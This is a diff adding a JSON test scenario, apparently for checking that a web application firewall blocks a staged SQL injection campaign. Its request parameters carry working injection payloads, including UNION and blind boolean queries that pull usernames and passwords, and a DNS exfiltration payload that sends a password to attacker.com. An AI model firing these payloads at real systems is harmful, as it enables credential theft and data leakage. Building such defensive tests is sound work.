@@ -1,0 +1,115 @@
+{
+  "id": "advanced-sqli-campaign",
+  "name": "Advanced SQL Injection Campaign",
+  "category": "Web Attacks",
+  "difficulty": "Advanced",
+  "description": "Sophisticated multi-stage SQL injection attack with various evasion techniques and payload types",
+  "steps": [
+    {
+      "id": "sqli-recon-1",
+      "name": "Database Error Enumeration",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/user/profile",
+        "params": {
+          "id": "1'"
+        }
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "expect": {
+        "blocked": true
+      }
+    },
+    {
+      "id": "sqli-recon-2",
+      "name": "Version Discovery via Comment",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/search",
+        "params": {
+          "q": "test' AND @@version/*"
+        }
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "sqli-recon-1"
+      ]
+    },
+    {
+      "id": "sqli-exploit-1",
+      "name": "Union-Based Data Extraction",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "admin' UNION SELECT 1,username,password FROM users WHERE id=1--",
+          "password": "dummy"
+        }
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "sqli-recon-2"
+      ]
+    },
+    {
+      "id": "sqli-exploit-2",
+      "name": "Boolean-Based Blind SQL Injection",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/products",
+        "params": {
+          "category": "electronics' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a'--"
+        }
+      },
+      "execution": {
+        "delayMs": 4000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "sqli-exploit-1"
+      ]
+    },
+    {
+      "id": "sqli-exfil-1",
+      "name": "Data Exfiltration via DNS",
+      "stage": "exfiltration",
+      "request": {
+        "method": "GET",
+        "url": "/reports",
+        "params": {
+          "filter": "active' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\test'))--"
+        }
+      },
+      "execution": {
+        "delayMs": 5000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "sqli-exploit-2"
+      ]
+    }
+  ]
+}
